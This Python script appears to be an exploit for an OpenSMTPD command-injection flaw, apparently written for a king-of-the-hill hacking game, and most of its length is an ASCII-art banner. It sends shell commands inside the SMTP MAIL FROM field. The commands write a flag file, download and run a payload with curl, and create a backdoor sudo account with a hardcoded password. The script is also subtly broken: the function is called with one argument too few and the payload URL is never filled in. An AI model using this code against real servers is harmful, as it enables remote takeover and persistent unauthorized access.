#!/usr/bin/env python3

import sys
from socket import *

commands = [
    'touch /home/$USER/koth.txt && echo "cd1a5cf3-70b4-403b-a60e-cd883667dfa2" > /home/$USER/koth.txt',
    'curl {payload_url} -o payload.sh && chmod +x ./payload.sh && ./payload.sh',
    'sudo useradd -m -s /bin/bash datadag && echo "datadag:CCSOdog123" | sudo chpasswd && sudo usermod -aG sudo datadag',
]

def exploit(victim_ip, victim_port, payload_url):
    for cmd in commands:
        payload = f"; {cmd};"

        s = socket(AF_INET, SOCK_STREAM)
        s.connect((victim_ip, int(victim_port)))

        res = s.recv(1024)
        if 'OpenSMTPD' not in str(res):
            print('[!] no baddie friend in sight')
            print('[!] Received: {}'.format(str(res)))
            print('[!] Exiting...')
            sys.exit(1)

        print('[*] theres a baddie with her baddie friend ')
        s.send(b'HELO x\r\n')
        res = s.recv(1024)
        if '250' not in str(res):
            print('[!] Error connecting, expected 250 ')
            print('[!] Received: {}'.format(str(res)))
            print('[!] Exiting...')
            sys.exit(1)

        print(f"[*] droppin' some shit: {cmd} ")
        s.send(bytes(f'MAIL FROM:<{payload}>\r\n', 'utf-8'))
        res = s.recv(1024)
        if '250' not in str(res):
            print('[!] shit was too stinky')
            print('[!] Received: {}'.format(str(res)))
            print('[!] Exiting...')
            sys.exit(1)

        s.send(b'RCPT TO:<root>\r\n')
        s.recv(1024)
        s.send(b'DATA\r\n')
        s.recv(1024)
        s.send(b'\r\nxxx\r\n.\r\n')
        s.recv(1024)
        s.send(b'QUIT\r\n')
        s.recv(1024)
        print('[*] damn you really the fart\n')

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <victim_ip> <victim_port>")
        print(f"Example: {sys.argv[0]} 192.168.1.100 25")
        sys.exit(1)

    victim_ip, victim_port = sys.argv[1:3]

    print("""
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##********##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%##***********#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@%%%%%#**********%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%%@@@@@@@@@@@@@@%%%%%%%%%#***+++**#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%#******@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%%%%%%%#****%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@%%%%%%%%%%%%%%%%%%%#*#@@@@@@@@@@@@@@@@@@@@@@@@%%%%@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%%%%%%%%@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%@@@@@@@@@@@@@@@%%%@%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%##########%####%%@@@@@@@@@@@%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%########################%@@@@@@@@@@@@@@%%@@@%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%##*++++++**####################%@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@%##***+==========+*##################%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@###**++++==============+################%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%###**++++==================+*###########%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%#####**++=======================+*#####%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%%%%##**+=====+++++==================+*##%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%%%%%*+++++++**#####%##**+===============+*%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%%%%#*+++++***++++***##%%%%#*+========++*****#%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%%@%%#*+++++++++++++++*******#*+=====++***######%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@%%@@%%*++++++++***++++++++++***++=====++******++++*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%%@@@@%#*+++++*########*++++++++**+=====+****++=++++++*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%%@@@@%#*+++++*#%@@@@@@@@@@#*++++++=====+++++++++++++++*%@@@@@@@@@@@@%%%%##%%%%%%%%%%%@%%@@@@@@@@@@@@@@@*=
@@@@@@@@@@@@@@%%@@@@@%#*++++++++**###%@@@#*##+==+======++==+#%@@@@@%##**%@@@@@@@@@@@@@%########**#####***#%#**#@@@@@@@@%=
@@@@@@@@@@@@@@%%@@@@@%#*++++====++**####***+==============+*#@@@%#%%%#*+#%@@@@@@@@@@@@%%##%%###########**####***@@@@@@@@%
@@@@@@@@@@@@@@%%@@%%@%#*++++=======+++++++==================+*******++++#%%@@@@@@@@@@@@%%%@%%%########**********#@@@@@@@@
@@@@@@@@@@@@@%%%@@@%%%#*+++++==================================+++++==++#%%@@@@@@@@@@@@%%%%#%%%%%%%%#*##%%%%%%%##%@@@@@@@
@@@@@@@@@@@@@%%%@@%%%##***+++++======================================+++#%%@@@@@@@@@@@@%%%@@@@@@@@@%###%@@@@@@@%#*#@@@@@@
@@@@@@@@@@@@@%%%%%%%###***+++++++++==================================+++#%%@@@@@@@@@@@@%@@@@@@@@@@@%###@@@@@@@@%#*#%@@@@@
@@@@@@@@@@@@@%%%%%%%%##****+++++++++=========+*#%%**++++###+=========++*#%@@@@@@@@@@@@@@@@@@@@@@@@@%##%@@@@@@@@@####%@@@@
@@@@@@@@@@@@@%%%%%%@%##*****++++++++========+***####***###*++=======+++*#%@@@@@@@@@@@@@@@@@@@@@@@@@%##%@@@@@@@@@#####%@@@
@@@@@@@@@@@@@%%%%%%@@@#*******+++++++=============++**++==========+++++*#%@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%#%@@
@@@@@@@@@@@@@%%%%%%%@@%#******++++++++============================++++*#%@@@@@@@@@@@@@@@@%%%%%@@@@@@@@%%%%@@@@@%%@@@@@@@@
@@@@@@@@@@@@%%%%%%%%%%%#*******++++++++=========+++++++++++======+++++*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@%%%%%%%@@@@@#******+++++++++++==+********+++****+===+++++*##+==+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@%%%%%%%@@@@@%*****++++++++++++*####%%%%%%%%%%%###*+++++++*#+=---=+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@%%%%%%%%%%@@@#****++++++++++*#%@@@@%%%%%%###%%@@%#*+++++*##+===---=*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@
@@@@@@@@@@@@%%%%%%%%%%%@@@#****++++++++**##%@%#*++***++++#@%#*++++++#@@%*+===--==*##%@@@@@@@@@@@@@@@@@@@@@@@@%##%%%@@@@@@
@@@@@@@@@@@@%%%%%%%%%%%%@@@#****+++++**++*****###########****++++++*%@@@%#+===---===+**#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@%%%%%%%%%%%%%@@@#*****+++++++++******++****+****+++++++*#%%%%%#*++===========+#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@%%%%%%#%%%%%%%%@@@%#******++++++***###########**+++++++++***###***++==============*%@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@%%%%%%%%%%%%%%%@@@@%##****+++++++***###%%%###**++++++++=+++++**===++**+++===========+#@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@%%%%%%%%%%%%%%%%@@@%%%##****+++++++++++++++++++++++*%#=======++====++**+++===========+*@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@%%%%%%%%%%%%%%%@@@@%######***++++++++++++++++++++++##+======++=====+++*+++++========+=#@@@@@@%%%%%%%%@@@@@@@@
@@@@@@@@@@@@%%%%%%%%%%%%%%%%@@@@%########******++***********++++*++======+========+++++============#@%*++++===++*#@@@@@@@
@@@@@@@@@%%##%%%%#%%%%%%%%%%@@@@@%####################****++++*++++======+==========+++=============++++==========+%@@@@@
@@@@@@@@%***#%%%%#####%%%%%%@@@@@%%###################***+++++++=++==================++++===========+++=============*%@@@
@@@@@@@@@#+++*##%#####%%%%%%%@@@%@%%################****++++++=+=++===================++++===========++++=============*%@
@@@@@@@@@#++=+*########%%%%%%@%%%%@%%%############*******+++============================++++++========+++++=============*
@%######*+====+*######%##%%%%%%%%%%%%%%##########*******++====+======================+===+++++++++====++**++=============
====++++++=++==+*#####%##%#%%%%%%%%%##%%########****++==+=====+======================++===+**++++++====++**+++===========
============++=+*######%##%%%%%%%%%%###***+++++++++++++++===========================++++==+****++++++====+***++++========
================+*#####%###%%%%%%%%%%#******++++++++++=======+======================+++++=+++***+++++=======++*+++++=====
================+*######%####%%%%%%%%###*+++++++++++======================================++++**++===========+***+++++===
=================*######%%###%%%%%%%#%#***+=++++++=========+========================++===++++***+=============+****+++++=
=================+#######%###%##%%%%###*+++++========++++++=========================+*+=+++*****+++===++========+****++++
=================+*#######%###%##%%%%%#*++=++++==+++++=++============================**++********++++++++++=======+***+++
==================*########%###%#%%%%%%#*++====+++======+=+++++======================+***********+++++++*+++++======+++++
==================+#%#####%#%###%%%#%%%%##*+===+===++++===============================******++++**++++++++***+=========++
==================+*#%#####%#####%#%#%%%####*+==========++============================*#****+++++*****+++****+++=========
====================*%%#####%#####%###%%%%#**#*+=========+==-=========================+*****++++++*******##***+++========
====================+#%%###########%###%%%%#******+===================================++++***++++++***###*****++++=======
++===================*#%%######%#########%%%%#******+=====+++========================++==+*#*++++++++*********+++++======
++++++================*#%%#####%%######%##%%%%%#**++**+=============================+++===+*#*+++++++++++*****++++++=====
===+++++++============+#%%%%####%%######%%#%%%%%%##*+++*+=============+*#%#+======++++++==++*#*+++++++++++*****++++++====
    """)

    print(f"[*] Targeting victim at {victim_ip}:{victim_port} 🎯")
    exploit(victim_ip, victim_port)